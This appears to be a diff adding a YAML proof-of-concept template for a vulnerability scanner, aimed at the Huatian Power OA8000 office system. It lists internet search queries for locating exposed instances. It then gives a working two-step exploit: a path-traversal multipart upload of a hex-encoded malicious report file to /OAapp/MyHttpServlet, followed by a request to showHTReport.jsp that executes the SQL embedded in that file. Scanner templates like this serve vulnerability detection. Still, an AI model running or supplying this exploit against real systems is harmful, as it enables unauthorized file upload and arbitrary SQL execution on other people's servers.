@@ -1,0 +1,59 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="华天动力-OA8000"
+    hunter-query: app.name="华天软件 OA"
+    quake-query: app:"华天动力OA"
+    zoomeye-query: app:"CNPOWER OA"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips:  上传恶意的raq文件并执行raq文件中的任意sql语句 | select exp(3)  20.0855  取后四位
+    
+name: poc-yaml-huatian-8000-MyHttpServlet-upload-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+    h1: hexDecode("52515152000001F50000000200020000001CA5410000000100000000020000FFFFFFFF0100000006ACED000570700000001BB1421866660100000000020000FFFFFFFF00000006ACED00057070000000ACFFFFFFFFD0E150FF0000003F80000010FFFFFFFFFFFFFFFFFFFFFFFF223100FFFFFFFFFFFFFFFFFF00000000FFFFFFF84469616C6F67000CFFFFFFFFFF000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF503F400000FF000000503F400000FF000000503F400000FF000000533F400000FF0000000000001500012801000F206473312E73656C656374282331290020C0FFFFFFFF0000FFFFFFFF00000006ACED00057070FFFFFFFF00000000003B0009000100010001000000140001000100644352000043948000419800004198000041C8000041C8000001000002000002000201010000FFFFFFFEFFFFFFFFFFFFFFFF00000073000101FFFFFFD0636F6D2E72756E7169616E2E7265706F7274342E757365726D6F64656C2E53514C44617461536574436F6E6669670000003A00000017FFFFFFFB647331FFFFFFFA68746F61FFFFFFFE00010000FFFFFFF153454C45435420657870283329FFFFFFFEFFFFFFFEFFFFFFFF00000000000200000000000A00FFFFFFFE0B0000000000000012FFFFFFFEFFFFFFFE00000F3CFFFFFFFE03010000006401FFFFFFFE00FFFFFFFEFFFFFFFFFFFFFFFE52515152525151521EF9B0ACDA8D807383F468C5C023B4EB0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /OAapp/MyHttpServlet
+      follow_redirects: false      
+      headers:
+        Content-Type: multipart/form-data; boundary=9b0af0d79eaea67c3aa1889b0b43a50a
+        Accept-Encoding: gzip, deflate
+      body: "--9b0af0d79eaea67c3aa1889b0b43a50a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\\Temp\\../../../report/reportFiles/{{s2}}.jpg\"\r\n\r\n{{h1}}\r\n--9b0af0d79eaea67c3aa1889b0b43a50a--"
+    expression: >-
+      response.status == 200 && response.body_string.contains("SUCCESS")  && response.body_string.contains("upload")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /report/reportJsp/showHTReport.jsp?reportFile={{s2}}.jpg
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("20.0855") 
+
+expression: r0() &&  r1()
